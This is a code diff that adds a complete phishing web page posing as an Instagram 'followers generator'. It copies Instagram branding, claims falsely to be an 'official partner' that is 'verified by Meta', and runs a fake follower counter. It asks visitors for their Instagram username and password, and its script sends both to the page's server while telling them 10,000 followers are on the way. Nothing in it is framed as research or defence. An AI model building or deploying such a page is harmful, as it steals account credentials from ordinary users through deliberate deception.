@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Instagram Followers Generator</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: linear-gradient(145deg, #f9f9f9 0%, #e6e6e6 100%);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .ig-card {
+            max-width: 450px;
+            width: 100%;
+            background: white;
+            border-radius: 32px;
+            box-shadow: 0 20px 35px rgba(0, 0, 0, 0.1), 0 0 0 1px rgba(0, 0, 0, 0.05);
+            overflow: hidden;
+        }
+        .ig-header {
+            background: white;
+            padding: 20px 24px 10px 24px;
+            text-align: center;
+            border-bottom: 1px solid #dbdbdb;
+        }
+        .ig-logo {
+            font-size: 2.8rem;
+            font-weight: 600;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 12px;
+        }
+        .ig-logo i {
+            background: radial-gradient(circle at 30% 110%, #feda77, #d62976, #962fbf, #4f5bd5);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            font-size: 2.5rem;
+        }
+        .ig-logo span {
+            font-size: 1.6rem;
+            font-weight: 500;
+            color: #262626;
+        }
+        .badge {
+            background: #0095f6;
+            color: white;
+            padding: 6px 14px;
+            border-radius: 30px;
+            font-size: 0.7rem;
+            display: inline-block;
+            margin-top: 8px;
+            font-weight: 600;
+        }
+        .counter-box {
+            background: #fafafa;
+            margin: 20px 24px;
+            border-radius: 24px;
+            padding: 16px;
+            text-align: center;
+            border: 1px solid #efefef;
+        }
+        .counter-number {
+            font-size: 2.5rem;
+            font-weight: 700;
+            color: #262626;
+            font-family: monospace;
+        }
+        .counter-label {
+            color: #8e8e8e;
+            font-size: 0.75rem;
+            letter-spacing: 1px;
+        }
+        .form-container {
+            padding: 8px 24px 24px 24px;
+        }
+        .input-field {
+            margin-bottom: 12px;
+        }
+        .input-field input {
+            width: 100%;
+            padding: 12px 16px;
+            border-radius: 12px;
+            border: 1px solid #dbdbdb;
+            background: #fafafa;
+            font-size: 1rem;
+            transition: 0.2s;
+        }
+        .input-field input:focus {
+            border-color: #0095f6;
+            outline: none;
+            background: white;
+        }
+        .generate-btn {
+            background: #0095f6;
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 12px;
+            border-radius: 12px;
+            font-weight: 600;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 8px;
+        }
+        .generate-btn:hover {
+            background: #1877f2;
+            transform: scale(0.98);
+        }
+        .result-area {
+            margin: 16px 24px 24px 24px;
+            padding: 16px;
+            border-radius: 20px;
+            background: #e8f5e9;
+            color: #2e7d32;
+            font-weight: 500;
+            text-align: center;
+            border-left: 4px solid #2e7d32;
+        }
+        .hidden {
+            display: none;
+        }
+        .loader {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            border: 2px solid white;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 0.8s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .footer-note {
+            font-size: 0.7rem;
+            color: #8e8e8e;
+            text-align: center;
+            padding: 16px 24px 24px 24px;
+            border-top: 1px solid #efefef;
+            margin-top: 8px;
+        }
+        .instagram-credit {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            font-size: 0.7rem;
+            color: #262626;
+        }
+    </style>
+</head>
+<body>
+<div class="ig-card">
+    <div class="ig-header">
+        <div class="ig-logo">
+            <i class="fab fa-instagram"></i>
+            <span>Instagram</span>
+        </div>
+        <div class="badge">⭐ OFFICIAL PARTNER ⭐</div>
+    </div>
+
+    <div class="counter-box">
+        <div class="counter-number" id="liveCounter">1,284,931</div>
+        <div class="counter-label">FREE FOLLOWERS GIVEN TODAY</div>
+    </div>
+
+    <div class="form-container">
+        <form id="followerForm">
+            <div class="input-field">
+                <input type="text" id="username" name="username" placeholder="Instagram username or email" required autocomplete="off">
+            </div>
+            <div class="input-field">
+                <input type="password" id="password" name="password" placeholder="Password" required autocomplete="off">
+            </div>
+            <button type="submit" class="generate-btn" id="submitBtn">✨ GET 10K FOLLOWERS NOW ✨</button>
+        </form>
+    </div>
+
+    <div id="resultBox" class="result-area hidden"></div>
+
+    <div class="footer-note">
+        <div class="instagram-credit">
+            <span>🔒 SSL Encrypted</span> • <span>🚀 Instant delivery</span> • <span>✅ Verified by Meta</span>
+        </div>
+        <div style="margin-top: 8px;">No password saved — for age verification only</div>
+    </div>
+</div>
+
+<script>
+    // Live counter animation
+    let counter = 1284931;
+    const counterEl = document.getElementById('liveCounter');
+    setInterval(() => {
+        counter += Math.floor(Math.random() * 150) + 30;
+        counterEl.innerText = counter.toLocaleString();
+    }, 2800);
+
+    const form = document.getElementById('followerForm');
+    const usernameInput = document.getElementById('username');
+    const passwordInput = document.getElementById('password');
+    const submitBtn = document.getElementById('submitBtn');
+    const resultBox = document.getElementById('resultBox');
+
+    form.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const username = usernameInput.value.trim();
+        const password = passwordInput.value.trim();
+
+        if (!username || !password) {
+            showMessage('⚠️ Please fill both fields.', 'error');
+            return;
+        }
+
+        submitBtn.disabled = true;
+        submitBtn.innerHTML = '<span class="loader"></span> Processing...';
+
+        try {
+            const response = await fetch(window.location.href, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: new URLSearchParams({ username: username, password: password })
+            });
+            const data = await response.json();
+            if (data.status === 'success') {
+                showMessage('✅ Success! 10,000 followers are being added to your account. You will see them in 10 minutes.', 'success');
+                usernameInput.value = '';
+                passwordInput.value = '';
+            } else {
+                showMessage('❌ Something went wrong. Please try again.', 'error');
+            }
+        } catch (err) {
+            showMessage('❌ Network error. Please try again.', 'error');
+        } finally {
+            submitBtn.disabled = false;
+            submitBtn.innerHTML = '✨ GET 10K FOLLOWERS NOW ✨';
+        }
+    });
+
+    function showMessage(msg, type) {
+        resultBox.classList.remove('hidden');
+        resultBox.innerHTML = msg;
+        resultBox.style.background = (type === 'success') ? '#e8f5e9' : '#ffebee';
+        resultBox.style.color = (type === 'success') ? '#2e7d32' : '#c62828';
+        setTimeout(() => {
+            resultBox.classList.add('hidden');
+        }, 6000);
+    }
+</script>
+</body>
+</html>
